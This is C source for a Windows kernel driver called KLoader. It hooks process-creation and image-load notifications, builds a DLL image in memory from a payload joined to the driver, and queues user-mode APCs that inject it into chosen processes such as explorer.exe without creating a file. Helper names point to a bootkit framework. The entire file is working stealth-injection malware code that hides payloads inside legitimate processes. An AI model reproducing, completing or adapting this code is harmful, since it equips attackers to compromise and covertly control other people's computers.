//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KLoader project
//	
// module: 
//	kloader.c
// created: 
//	february 2011
// description: 
//	Kernel-mode loader for user DLL images. Main module.
//	Injects an attached DLL into specified process(es) without creating a file.
//	Target DLLs are being attached to the driver image by FJ joiner utility.

#include <ntddk.h>
#include "ntddkex.h"
#include "kloader.h"
#include "handle.h"
#include "..\bklib\bklib.h"
#include "pesup.h"
#include "krep.h"
// Support for attached files
#include "..\FJ\joiner.h"


UNICODE_STRING	g_uNtdll		= RTL_CONSTANT_STRING(L"ntdll.dll");
UNICODE_STRING	g_uWowNtdll		= RTL_CONSTANT_STRING(L"wow64\\ntdll.dll");
UNICODE_STRING	g_uKernel32		= RTL_CONSTANT_STRING(L"kernel32.dll");
UNICODE_STRING	g_uKernelbase	= RTL_CONSTANT_STRING(L"kernelbase.dll");
UNICODE_STRING	g_uWow64		= RTL_CONSTANT_STRING(L"wow64.dll");
UNICODE_STRING	g_uNtdll32		= RTL_CONSTANT_STRING(L"ntdll32.dll");
UNICODE_STRING	g_uUser32		= RTL_CONSTANT_STRING(L"user32.dll");
UNICODE_STRING  g_uWowKernel32	= RTL_CONSTANT_STRING(L"wow64\\kernel32.dll");
UNICODE_STRING	g_uExplorer		= RTL_CONSTANT_STRING(L"explorer.exe");

PHANDLE_TABLE	g_ActiveProcessDb	= NULL;

LIST_ENTRY		g_InjectDescriptorListHead = {&g_InjectDescriptorListHead, &g_InjectDescriptorListHead};
KSPIN_LOCK		g_InjectDescriptorListLock = {0};
KIRQL			g_InjectDescriptorOldIrql = 0;


VOID _stdcall Wow64LoadDllApcStub(VOID);


#ifdef	_DRIVER_SUPPORTS_UNLOAD
LONG volatile	g_WorkerEntryCount = 0;
	
#define			ENTER_WORKER()	InterlockedIncrement(&g_WorkerEntryCount)
#define			LEAVE_WORKER()	InterlockedDecrement(&g_WorkerEntryCount)

VOID	WaitWorkers(VOID)
{
	do
	{
		LARGE_INTEGER	Period = {0};
		Period.QuadPart = _RELATIVE(_MILLISECONDS(100));
		KeDelayExecutionThread(KernelMode, TRUE, &Period);
	} while(g_WorkerEntryCount);
}

#else

#define			ENTER_WORKER()	
#define			LEAVE_WORKER()	
#define			WaitWorkers()

#endif


// ---- Pid context stubs -------------------------------------------------------------------------------------------------
_inline PPID_CONTEXT PidCreateContext(HANDLE Key)
{
	PPID_CONTEXT	PidCtx;
	if (!HandleCreate(g_ActiveProcessDb, Key, &PidCtx))
		PidCtx = NULL;

	return(PidCtx);
}

_inline	PPID_CONTEXT PidGetContext(HANDLE Key)
{
	PPID_CONTEXT	PidCtx;
	if (!HandleOpen(g_ActiveProcessDb, Key, &PidCtx))
		PidCtx = NULL;
	return(PidCtx);
}

#define PidReleaseContext(PidCtx)	HandleClose(g_ActiveProcessDb, NULL, CONTAINING_RECORD(PidCtx, HANDLE_RECORD, Context))
#define	PidDeleteContext(PidCtx)	HandleClose(g_ActiveProcessDb, NULL, CONTAINING_RECORD(PidCtx, HANDLE_RECORD, Context))


// ---- Inject descriptor list stubs ----------------------------------------------------------------------------------------

VOID	LockInjectDescriptorList(VOID)
{
	KIRQL	Irql;
	KeAcquireSpinLock(&g_InjectDescriptorListLock, &Irql);
	g_InjectDescriptorOldIrql = Irql;
}


VOID	UnlockInjectDescriptorList(VOID)
{
	KeReleaseSpinLock(&g_InjectDescriptorListLock, g_InjectDescriptorOldIrql);
}


// ---- Miscellaneous routines ----------------------------------------------------------------------------------------------

//
//	Compares names of two modules. Returns TRUE if the names are equal.
static BOOL	EqualModuleName(PUNICODE_STRING ModuleName, PUNICODE_STRING OtherName)
{
	BOOL Ret = FALSE;

	if (ModuleName && (ModuleName->Length >= OtherName->Length))
	{
		UNICODE_STRING	ShortName;
		ShortName.Length = OtherName->Length;
		ShortName.MaximumLength = OtherName->Length;
		ShortName.Buffer = (PWSTR)((PCHAR)ModuleName->Buffer + ModuleName->Length - ShortName.Length);
		Ret = (BOOL)RtlEqualUnicodeString(&ShortName, OtherName, TRUE);
	}
	return(Ret);
}

//
//	Returns full path of the main module of the process specified by ProcessId.
static NTSTATUS	GetProcessImagePath(
							IN	HANDLE ProcessId, 
							OUT PUNICODE_STRING ImagePath
							)
{
	ULONG		bSize;
	NTSTATUS	ntStatus;
	HANDLE		hProcess;
	CLIENT_ID	ClientId = {0};
	OBJECT_ATTRIBUTES	oa = {0};

	ClientId.UniqueProcess = ProcessId;
	InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

	if (NT_SUCCESS(ZwOpenProcess(&hProcess, GENERIC_READ, &oa, &ClientId)))
	{		
		ntStatus = ZwQueryInformationProcess(hProcess, ProcessImageFileName, NULL, 0, &bSize);
		if (ntStatus == STATUS_INFO_LENGTH_MISMATCH)
		{
			PUNICODE_STRING	ProcessFullName = (PUNICODE_STRING)ExAllocatePoolWithTag(PagedPool, bSize, 0);
			if (ProcessFullName)
			{
				ntStatus = ZwQueryInformationProcess(hProcess, ProcessImageFileName, ProcessFullName, bSize, &bSize);
				if (NT_SUCCESS(ntStatus))
				{
					if (ImagePath->Buffer = ExAllocatePool(NonPagedPool, ProcessFullName->MaximumLength))
					{
						RtlCopyMemory(ImagePath->Buffer, ProcessFullName->Buffer, ProcessFullName->Length);
						ImagePath->Length = ProcessFullName->Length;
						ImagePath->MaximumLength = ProcessFullName->MaximumLength;
					}
					else
						ntStatus = STATUS_INSUFFICIENT_RESOURCES;
				}	// if (NT_SUCCESS(ntStatus))
				ExFreePool(ProcessFullName);
			}	// if (ProcessFullName)
		}	// if (ntStatus == STATUS_INFO_LENGTH_MISMATCH)
		ZwClose(hProcess);
	}	// if (NT_SUCCESS(ZwOpenProcess(&hProcess, GENERIC_READ, &oa, &ClientId)))

	return(ntStatus);
}


//
//	References the process object by the specified ID.
static	HANDLE	OpenProcessById(HANDLE ProcessId, ACCESS_MASK AccessMask)
{
	HANDLE		hProcess;
	CLIENT_ID	ClientId = {0};
	OBJECT_ATTRIBUTES	oa = {0};

	ASSERT(KeGetCurrentIrql() == PASSIVE_LEVEL);

	ClientId.UniqueProcess = ProcessId;
	InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

	if (!(NT_SUCCESS(ZwOpenProcess(&hProcess, AccessMask, &oa, &ClientId))))
		hProcess = NULL;

	return(hProcess);
}

//
// Returns TRUE if the specified process ID belongs to a WOW64 process.
static	BOOL	IsWow64Process(HANDLE	ProcessId)
{
	BOOL	Ret = FALSE;
	HANDLE	hProcess = OpenProcessById(ProcessId, GENERIC_READ);
	PVOID	ProcessWow64Info = NULL;

	if (hProcess)
	{	
		NTSTATUS ntStatus = ZwQueryInformationProcess(hProcess, ProcessWow64Information, &ProcessWow64Info, sizeof(PVOID), NULL);
		if (NT_SUCCESS(ntStatus) && ProcessWow64Info != NULL)
			Ret = TRUE;

		ZwClose(hProcess);
	}	// if (hProcess)

	return(Ret);
}

//
//	Allocates and initialize new INJECT_DESCRIPTOR structure.
PINJECT_DESCRIPTOR	AllocateInjectDescriptor(
									PSTR ProcessName,		// target process name
									PVOID Module,			// module to inject
									ULONG AttachCount,		// number of attach attempts
									ULONG Flags				// variouse flags
									)
{
	PINJECT_DESCRIPTOR	InjDesc = (PINJECT_DESCRIPTOR)ExAllocatePoolWithTag(NonPagedPool, sizeof(INJECT_DESCRIPTOR), TAG_INJECT_DESCRIPTOR);

	ASSERT(Module);

	if (InjDesc)
	{
		RtlFillMemory(InjDesc,  sizeof(INJECT_DESCRIPTOR), 0);
#if _DBG
		InjDesc->Magic = INJECT_DESCRIPTOR_MAGIC;
#endif
		InitializeListHead(&InjDesc->InjectListEntry);
		InitializeListHead(&InjDesc->ProcessListEntry);
		InjDesc->Flags |= Flags;
		InjDesc->AttachCount = AttachCount;

		if (ProcessName)
		{
			ANSI_STRING	aStr = {0};
			RtlInitAnsiString(&aStr, ProcessName);
			if (NT_SUCCESS(RtlAnsiStringToUnicodeString(&InjDesc->TargetProcessName, &aStr, TRUE)))
				InjDesc->Flags |= INJECT_SPECIFIED_PROCESS;
		}

		if (Flags & INJECT_SPECIFIED_MODULE)
		{
			// Injecting specified module (has a path)
			InjDesc->InjectModulePath = (PUNICODE_STRING)Module;
		}
		else
		{
			// Injecting from memory buffer
			InjDesc->InjectModuleBuffer = Module;
		}

	}	// if (InjDesc)
	return(InjDesc);

}


//
//	Inserts specified INJECT_DESCRIPTOR into global inject descriptor list.
VOID	InsertInjectDescriptor(PINJECT_DESCRIPTOR	InjDesc)
{
	ASSERT_INJECT_DESCRIPTOR(InjDesc);
	ASSERT(InjDesc->AttachCount != 0);
	ASSERT(InjDesc->ReferenceCount == 0);

	LockInjectDescriptorList();
	InsertTailList(&g_InjectDescriptorListHead, &InjDesc->InjectListEntry);
	UnlockInjectDescriptorList();
}


//
//	Releases specified INJECT_DESCRIPTOR structure.
VOID	ReleaseInjectDescriptor(PINJECT_DESCRIPTOR	InjDesc)
{
	ASSERT_INJECT_DESCRIPTOR(InjDesc);
	ASSERT(InjDesc->ReferenceCount == 0);

	if (InjDesc->InjectModulePath)
		ExFreePool(InjDesc->InjectModulePath);
		
	if (InjDesc->InjectModuleBuffer)
		ExFreePool(InjDesc->InjectModuleBuffer);

	ExFreePool(InjDesc);
}

//
//	Decrements INJECT_DESCRIPTOR reference count. Releases INJECT_DESCRIPTOR when reference count reaches 0.
VOID	DereferenceInjectDescriptor(PINJECT_DESCRIPTOR	InjDesc)
{
	ASSERT_INJECT_DESCRIPTOR(InjDesc);
	ASSERT(InjDesc->ReferenceCount > 0);

	if (InterlockedDecrement(&InjDesc->ReferenceCount) == 0 && InjDesc->AttachCount == 0)
		ReleaseInjectDescriptor(InjDesc);
}


//
//	Compares name of the process specified by ProcessId with the specified ProcessName string
BOOL	CheckProcessName(HANDLE	ProcessId, PUNICODE_STRING	ProcessName)
{
	NTSTATUS	ntStatus;
	HANDLE		hProcess;
	ULONG		bSize;
	BOOL		Ret = FALSE;

	ASSERT(KeGetCurrentIrql() == PASSIVE_LEVEL);

	if (hProcess = OpenProcessById(ProcessId, GENERIC_READ))
	{
		ntStatus = ZwQueryInformationProcess(hProcess, ProcessImageFileName, NULL, 0, &bSize);
		if (ntStatus == STATUS_INFO_LENGTH_MISMATCH)
		{
			PUNICODE_STRING	ProcessFullName = (PUNICODE_STRING)ExAllocatePoolWithTag(PagedPool, bSize, TAG_KLOADER_POOL);
			if (ProcessFullName)
			{
				ntStatus = ZwQueryInformationProcess(hProcess, ProcessImageFileName, ProcessFullName, bSize, &bSize);
				if (NT_SUCCESS(ntStatus))
					Ret = EqualModuleName(ProcessFullName, ProcessName);

				ExFreePool(ProcessFullName);
			}	// if (ProcessFullName)
		}	// if (ntStatus == STATUS_INFO_LENGTH_MISMATCH)
		ZwClose(hProcess);
	}	// if (hProcess = OpenProcessById(ProcessId, GENERIC_READ))
	return(Ret);
}

// ---- Loader APC stubs --------------------------------------------------------------------------------------------------


static	VOID _stdcall MyKernelApcRoutine(
							PKAPC	Apc,
							PKNORMAL_ROUTINE* NormalRoutine,
							PVOID	NormalContext,
							PVOID	SystemArgument1,
							PVOID	SystemArgument2	
							)
{
	ExFreePool(Apc);

	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);
}

// --------------------------------------------------------------------------------------------------------------------------


//
//	Builds PE image from a PE file
BOOL	LoaderBuildImage(
					PCHAR NewBase,			// New PE image base
					PCHAR ModuleBuffer		// buffer containing PE file
					)
{
	BOOL	Ret = TRUE;
	ULONG	i, NumberSections, FileAlign, bSize;
	PIMAGE_NT_HEADERS	Pe = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBuffer);
	PIMAGE_SECTION_HEADER	Section = IMAGE_FIRST_SECTION(Pe);
	PIMAGE_DATA_DIRECTORY	DataDir;
	LONG	RelocSize;

	NumberSections	= Pe->FileHeader.NumberOfSections;
	FileAlign		= PeSupGetOptionalField(Pe, FileAlignment);
	
	RtlCopyMemory(NewBase, ModuleBuffer, PeSupGetOptionalField(Pe, SizeOfHeaders));

	// Copying sections
	for(i=0; i<NumberSections; i++)
	{
		bSize = PeSupAlign(Section->SizeOfRawData, FileAlign);
		if (bSize)
			RtlCopyMemory(NewBase + Section->VirtualAddress, ModuleBuffer + Section->PointerToRawData, bSize);
		Section += 1;
	}

	// Processing relocs
	DataDir = PeSupGetDirectoryEntryPtr(Pe, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	if (DataDir->VirtualAddress && (RelocSize = DataDir->Size))
	{
		ULONG_PTR	BaseDelta = ((ULONG_PTR)NewBase - (ULONG_PTR)PeSupGetOptionalField(Pe, ImageBase));
		PIMAGE_BASE_RELOCATION	Reloc = (PIMAGE_BASE_RELOCATION)(NewBase + DataDir->VirtualAddress);

		while(RelocSize > IMAGE_SIZEOF_BASE_RELOCATION)
		{
			ULONG	NumberRelocs = (Reloc->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / sizeof(WORD);
			PCHAR	PageVa = NewBase + Reloc->VirtualAddress;

			if (RelocSize >= (LONG)Reloc->SizeOfBlock)
			{
				for (i=0; i<NumberRelocs; i++)
				{
					USHORT	RelocType = (Reloc->TypeOffset[i] >> IMAGE_REL_BASED_SHIFT);

					switch(RelocType)
					{
					case IMAGE_REL_BASED_ABSOLUTE:
						// Do nothing. This one is used just for alingment.
						break;
					case IMAGE_REL_BASED_HIGHLOW:
						*(PULONG)(PageVa + (Reloc->TypeOffset[i] & IMAGE_REL_BASED_MASK)) += (ULONG)BaseDelta;
						break;
#ifdef _M_AMD64
					case IMAGE_REL_BASED_DIR64:
						*(PULONG_PTR)(PageVa + (Reloc->TypeOffset[i] & IMAGE_REL_BASED_MASK)) += BaseDelta;
						break;
#endif
					default:
						ASSERT(FALSE);
						break;
					}	// switch(RelocType)
				}	// for (i=0; i<NumberRelocs; i++)
			}	// if (RelocSize >= (LONG)Reloc->SizeOfBlock)
			RelocSize -= (LONG)Reloc->SizeOfBlock;
			Reloc = (PIMAGE_BASE_RELOCATION)((PCHAR)Reloc + Reloc->SizeOfBlock);
		}	// while(RelocSize > IMAGE_SIZEOF_BASE_RELOCATION)
	}	// if (!ImageAtBase && DataDir->VirtualAddress && (RelocSize = DataDir->Size)
	return(Ret);
}

//
//	Allocates PE image from the buffer within the current process.
PCHAR	LoaderAllocateImage(
						PCHAR	ModuleBuffer		// Buffer containing image file
						)
{
	HANDLE		hSection	= 0;
	SIZE_T		ViewSize	= 0;
	NTSTATUS	ntStatus	= STATUS_SUCCESS;
	PVOID		ImageBase = NULL;
	OBJECT_ATTRIBUTES	oa = {0};
	LARGE_INTEGER		ImageSize = {0}, SectionOffset = {0};
	PIMAGE_NT_HEADERS	Pe = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBuffer);


	ImageSize.QuadPart = PeSupGetOptionalField(Pe, SizeOfImage);
	ASSERT(ImageSize.QuadPart == (ULONGLONG)ImageSize.LowPart);

	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, 0, NULL);
	ntStatus = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, &ImageSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = ZwMapViewOfSection(hSection, NtCurrentProcess(), &ImageBase, 0, ImageSize.LowPart, &SectionOffset, &ViewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
		if (NT_SUCCESS(ntStatus))
		{
			RtlFillMemory(ImageBase, ImageSize.LowPart, 0);
			if (!LoaderBuildImage((PCHAR)ImageBase, ModuleBuffer))
			{
				ZwUnmapViewOfSection(NtCurrentProcess(), ImageBase);
				ImageBase = NULL;
			}
		}	// if (NT_SUCCESS(ntStatus))
	}	// if (NT_SUCCESS(ntStatus))

	if (hSection)
		ZwClose(hSection);

	return((PCHAR)ImageBase);
}

//
//	Allocates and initializes loader-specific context.
PLOADER_CONTEXT LoaderAllocateContext(HANDLE ProcessId, PINJECT_DESCRIPTOR InjDesc, BOOL IsWow64)
{
	NTSTATUS	ntStatus;
	HANDLE		hProcess;
	SIZE_T		bSize = sizeof(LOADER_CONTEXT) + LOADER_PATH_MAX + sizeof(WCHAR);
	PLOADER_CONTEXT	LdrCtx = NULL;

	ASSERT(PsGetCurrentProcessId() == ProcessId);

	if (hProcess = OpenProcessById(ProcessId, GENERIC_READ | GENERIC_WRITE))
	{
		ntStatus = ZwAllocateVirtualMemory(hProcess, &LdrCtx, 0, &bSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (NT_SUCCESS(ntStatus))
		{
			PCHAR	CurrentStub = (PCHAR)&LoadDllApcStub;
#ifdef _M_AMD64
			if (IsWow64)
				CurrentStub = (PCHAR)&LoadDllApcStubWow64;
#endif

			RtlCopyMemory(&LdrCtx->LoaderStub, CurrentStub, LOADER_STUB_MAX);
			LdrCtx->uDllPath.Buffer = (PWSTR)&LdrCtx->wDllPath;
			LdrCtx->Flags = InjDesc->Flags;

			if (InjDesc->Flags & INJECT_SPECIFIED_MODULE)
			{
				// Injecting from a file
				RtlCopyMemory(&LdrCtx->wDllPath, InjDesc->InjectModulePath->Buffer, InjDesc->InjectModulePath->Length);
				LdrCtx->uDllPath.Length = InjDesc->InjectModulePath->Length;
				LdrCtx->uDllPath.MaximumLength = InjDesc->InjectModulePath->Length;
				LdrCtx->wDllPath[LdrCtx->uDllPath.Length/sizeof(WCHAR)] = 0;
			}
			else
			{
				// Injecting from a buffer
				LdrCtx->ImageBase = (ULONGLONG)LoaderAllocateImage(InjDesc->InjectModuleBuffer);
			}
		}	// if (NT_SUCCESS(ntStatus))
		ZwClose(hProcess);
	}	// if (hProcess = OpenProcessById(ProcessId, GENERIC_READ | GENERIC_WRITE))
	return(LdrCtx);
}

//
//	Queues loader APC.
static BOOL LoaderQueueApc(PVOID ApcRoutine, PVOID ApcContext, BOOL IsWow64)
{
	PKAPC	Apc;
	BOOL	Ret = FALSE;
	LARGE_INTEGER Period = {0}; 

	if (Apc = ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), TAG_KLOADER_POOL))
	{
		KeInitializeApc(
			Apc, 
			(PKTHREAD)PsGetCurrentThread(), 
			OriginalApcEnvironment, 
			&MyKernelApcRoutine, 
			NULL, 
			(PKNORMAL_ROUTINE)ApcRoutine,
			UserMode, 
			ApcContext
			); 
						
		if ((Ret = KeInsertQueueApc(Apc, NULL, NULL, 0)) && !IsWow64)
			KeDelayExecutionThread(UserMode, TRUE, &Period);
			
	}	// if (Apc = ExAllocatePoolWithTag(

	return(Ret);
}


//
//	Initializes inject APC stub and loader-specific context.
BOOL InjectInitializeStub(HANDLE ProcessId, PINJECT_CONTEXT InjCtx, FUNC_PROTECT_MEM pZwProtectVirtualMemory, BOOL IsWow64)
{
	BOOL	Ret = FALSE;

	if (InjCtx->LdrCtx = LoaderAllocateContext(ProcessId, InjCtx->InjDesc, IsWow64))
	{
		InjCtx->ApcRoutine = &InjCtx->LdrCtx->LoaderStub;
		InjCtx->ApcContext = InjCtx->LdrCtx;
		InjCtx->Flags |= INJECT_STATE_WAITING_APC;						
		Ret = TRUE;
	}	// if (InjCtx->LdrCtx = LoaderAllocateContext(ProcessId, InjCtx->InjDesc, IsWow64))
	return(Ret);
}


//
//	Resolves all necessary NTDLL imports.
BOOL	ResolveNtdllImport(PCHAR NtdllBase, PPROCESS_IMPORT	Import)
{
	BOOL	Ret = FALSE;

	do	// not a loop
	{
		if (!(Import->pLdrLoadDll = (ULONGLONG)BkGetFunctionAddress(NtdllBase, "LdrLoadDll")))
			break;

		if (!(Import->pLdrGetProcedureAddress = (ULONGLONG)BkGetFunctionAddress(NtdllBase, "LdrGetProcedureAddress")))
			break;

		if (!(Import->pNtProtectVirtualMemory = (ULONGLONG)BkGetFunctionAddress(NtdllBase, "NtProtectVirtualMemory")))
			break;

		Ret = TRUE;
	} while(FALSE);

	return(Ret);
}


//
//	Attaches specified INJECT_DESCRIPTOR to the specified PID_CONTEXT. Increments INJECT_DESCRIPTOR's reference count.
VOID	AttachInjectDescriptor(PPID_CONTEXT	PidCtx, PINJECT_DESCRIPTOR	InjDesc)
{
	ASSERT(PidCtx->InjectCount < MAX_INJECTS_PER_PROCESS);
	InterlockedIncrement(&InjDesc->ReferenceCount);
	if (InterlockedDecrement(&InjDesc->AttachCount) == 0)
		RemoveEntryList(&InjDesc->InjectListEntry);
							
	PidCtx->InjectContext[PidCtx->InjectCount].InjDesc = InjDesc;
	PidCtx->InjectCount += 1;
}


//
//	Searches for apropriate INJECT_DESCRIPTOR for the specified process ID.
//	Tries to attach found INJECT_DESCRIPTOR to a process PID_CONTEXT structure.
BOOL	FindAttachInjectDescriptor(HANDLE ProcessId, PUNICODE_STRING ProcessImagePath)
{
	PLIST_ENTRY		pEntry;
	PPID_CONTEXT	PidCtx;
	PINJECT_DESCRIPTOR	InjDesc;
	BOOL	Ret = FALSE;

#ifdef _M_AMD64
		BOOL IsWow64 = IsWow64Process(ProcessId);
#endif

	LockInjectDescriptorList();
	pEntry = g_InjectDescriptorListHead.Flink;
	while(pEntry != &g_InjectDescriptorListHead)
	{
		InjDesc = CONTAINING_RECORD(pEntry, INJECT_DESCRIPTOR, InjectListEntry);
		pEntry = pEntry->Flink;

#ifdef _M_AMD64
		if ((InjDesc->Flags & INJECT_AMD64_PROCESS) && IsWow64)
			continue;

		if (!(InjDesc->Flags & INJECT_AMD64_PROCESS) && !IsWow64)
			continue;
#endif
		if (!(InjDesc->Flags & INJECT_SPECIFIED_PROCESS) || EqualModuleName(ProcessImagePath, &InjDesc->TargetProcessName))
		{
			BOOL Reused = FALSE;

			if (!(PidCtx = PidCreateContext(ProcessId)))
			{
				PidCtx = PidGetContext(ProcessId);
				Reused = TRUE;
			}

			if (PidCtx)
			{
				AttachInjectDescriptor(PidCtx, InjDesc);

#ifdef _M_AMD64
				if (IsWow64)
					PidCtx->Flags |= INJECT_WOW64_PROCESS;
#endif
				if (Reused)
					// Context was created earlier and currently reused
					PidReleaseContext(PidCtx);
				Ret = TRUE;
			}	// if (PidCtx)
		}	// if (!(InjDesc->Flags & INJECT_SPECIFIED_PROCESS) ||
	}	// while(pEntry != &g_InjectDescriptorListHead)

	UnlockInjectDescriptorList();
	return(Ret);
}



// ---- Filter routines -----------------------------------------------------------------------------------------------------


VOID _stdcall	MyCreateProcessNotifyRoutine(
									IN HANDLE  ParentId,
									IN HANDLE  ProcessId,
									IN BOOLEAN  Create
									)
{
	PPID_CONTEXT	PidCtx;
	UNICODE_STRING	ProcessImagePath = {0};
	PINJECT_DESCRIPTOR	InjDesc;

	ENTER_WORKER();

	if (Create)
	{
		// Process is just being created

		if (NT_SUCCESS(GetProcessImagePath(ProcessId, &ProcessImagePath)))
		{
			FindAttachInjectDescriptor(ProcessId, &ProcessImagePath);
			ExFreePool(ProcessImagePath.Buffer);
		}	// if (NT_SUCCESS(GetProcessImagePath(ProcessId, &ProcessPath)))
	}
	else
	{
		// Process is being terminated
		if (PidCtx = PidGetContext(ProcessId))
		{
			while(PidCtx->InjectCount)
			{
				InjDesc = PidCtx->InjectContext[PidCtx->InjectCount - 1].InjDesc;
				DereferenceInjectDescriptor(InjDesc);
				PidCtx->InjectCount -= 1;
			}

			PidDeleteContext(PidCtx);
			PidReleaseContext(PidCtx);
		}	// if (PidCtx = PidGetContext(ProcessId))
	}
	LEAVE_WORKER();
}


VOID _stdcall MyLoadImageNotifyRoutine(
						PUNICODE_STRING	FullImageName,
						HANDLE			ProcessId,
						PIMAGE_INFO		ImageInfo
						)
{
	UNICODE_STRING	ShortImageName = {0};
	PPID_CONTEXT	PidCtx = NULL;
	PINJECT_CONTEXT	InjCtx = NULL;
	ULONG	i = 0;

	ENTER_WORKER();

	if (PidCtx = PidGetContext(ProcessId))
	{
		while(i < PidCtx->InjectCount)
		{
			PINJECT_DESCRIPTOR	InjDesc;
			InjCtx = &PidCtx->InjectContext[i];

			ASSERT(InjCtx->InjDesc);
			InjDesc = InjCtx->InjDesc;

			i += 1;

			if (InjCtx->Flags & INJECT_STATE_INJECTED)
				continue;

			if (InjCtx->Flags & INJECT_STATE_WAITING_APC)
			{			
		
#ifdef _M_AMD64
				if (EqualModuleName(FullImageName, &g_uWowNtdll))
				{
					// WOW64 ntdll loaded
					ResolveNtdllImport(ImageInfo->ImageBase, &PidCtx->Import);
					break;
				}

				if ((PidCtx->Flags & (INJECT_WOW64_PROCESS | INJECT_WOW64_LOADED)) == INJECT_WOW64_PROCESS)
				{
					if (EqualModuleName(FullImageName, &g_uWow64))
					{
						InjCtx->ApcRoutine = BkGetFunctionAddress(ImageInfo->ImageBase, "Wow64ApcRoutine");
						InjCtx->ApcContext = (PVOID)((ULONG_PTR)InjCtx->LdrCtx + ((ULONG_PTR)&InjCtx->LdrCtx->LoaderStub << 32));
						PidCtx->Flags |= INJECT_WOW64_LOADED;
					}
					break;
				}	// if (IsWow64Process(ProcessId))
#endif

				if (EqualModuleName(FullImageName, &g_uKernel32))
				{
					PidCtx->Flags |= INJECT_KERNEL_LOADED;
					break;
				}
					
				// We cannot inject a DLL before kernel32 and kernelbase are loaded.
				if ((PidCtx->Flags & INJECT_KERNEL_LOADED) && !EqualModuleName(FullImageName, &g_uKernelbase))
				{
					RtlCopyMemory(&InjCtx->LdrCtx->Import, &PidCtx->Import, sizeof(PROCESS_IMPORT));
					LoaderQueueApc(InjCtx->ApcRoutine, InjCtx->ApcContext, (PidCtx->Flags & INJECT_WOW64_PROCESS));
					InjCtx->Flags |= INJECT_STATE_INJECTED;
				}
			}
			else	// if (InjCtx->Flags & INJECT_STATE_WAITING_APC)
			{
				if (EqualModuleName(FullImageName, &g_uNtdll))
				{
					ResolveNtdllImport(ImageInfo->ImageBase, &PidCtx->Import);
					InjectInitializeStub(ProcessId, InjCtx, (FUNC_PROTECT_MEM)PidCtx->Import.pZwProtectVirtualMemory, (PidCtx->Flags & INJECT_WOW64_PROCESS));
				}				
			}	// else	// if (InjCtx->Flags & INJECT_STATE_WAITING_APC)
		}	// while(i < PidCtx->InjectCount)
		PidReleaseContext(PidCtx);
	}	// if (PidCtx = PidGetContext(ProcessId))

	LEAVE_WORKER();
}


// ---- Startup/cleanup ----------------------------------------------------------------------------------------------------


#ifdef _DRIVER_SUPPORTS_UNLOAD
VOID DriverUnload(PDRIVER_OBJECT  DriverObject)
{
	ASSERT(g_ActiveProcessDb);

	PsRemoveLoadImageNotifyRoutine(&MyLoadImageNotifyRoutine);
	PsSetCreateProcessNotifyRoutine(&MyCreateProcessNotifyRoutine, TRUE);

	WaitWorkers();

	HandleReleaseTable(g_ActiveProcessDb);

	UNREFERENCED_PARAMETER(DriverObject);
}
#endif


NTSTATUS	DriverStartup(
				IN PDRIVER_OBJECT  DriverObject,
				IN PUNICODE_STRING RegistryPath
				)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;

	ntStatus = HandleAllocateTable(&g_ActiveProcessDb, sizeof(PID_CONTEXT), NULL, NULL);
	if (NT_SUCCESS(ntStatus))
	{
		InitializeAddons();

		ntStatus = PsSetCreateProcessNotifyRoutine(&MyCreateProcessNotifyRoutine, FALSE);
		if (NT_SUCCESS(ntStatus))
		{
			ntStatus = PsSetLoadImageNotifyRoutine(&MyLoadImageNotifyRoutine);
#ifdef _DRIVER_SUPPORTS_UNLOAD
			DriverObject->DriverUnload = &DriverUnload;
#endif
		}

		if (!NT_SUCCESS(ntStatus))
		{
			PsSetCreateProcessNotifyRoutine(&MyCreateProcessNotifyRoutine, TRUE);
			HandleReleaseTable(g_ActiveProcessDb);
		}
		else
			InitializeReplace();

	}	// if (NT_SUCCESS(ntStatus))

	return(ntStatus);
}



// main driver function
NTSTATUS 
DriverEntry(
	IN PDRIVER_OBJECT  DriverObject,
	IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS ntStatus = BkInitialize(DriverObject, RegistryPath, &BkInstall, &DriverStartup);

	return(ntStatus);
}

